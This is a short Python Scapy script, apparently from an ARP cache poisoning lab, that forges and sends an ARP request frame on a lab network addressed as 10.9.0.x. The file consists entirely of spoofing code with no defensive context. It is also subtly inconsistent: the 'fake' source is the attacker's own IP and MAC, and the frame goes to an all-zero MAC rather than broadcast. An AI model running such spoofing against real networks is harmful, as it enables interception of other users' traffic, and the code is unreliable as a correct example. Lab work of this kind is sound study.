from scapy.all import *
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP, TCP

# 타겟의 IP 주소와 MAC 주소
IP_V = "10.9.0.5"                   # target_ip
MAC_V_real = "02:42:0a:09:00:05"    # target_mac

# 공격자의 MAC 주소와 IP 주소
IP_T = "10.9.0.105"                  # attacker_ip
MAC_T_fake = "02:42:0a:09:00:69"    # attacker_mac

# ARP Request 패킷 생성
ether = Ether(src = MAC_T_fake, dst = "00:00:00:00:00:00")
arp = ARP(psrc = IP_T, hwsrc = MAC_T_fake, pdst = IP_V)

# ARP Request 패킷 전송
arp.op = 1
frame = ether/arp
sendp(frame, iface='eth0')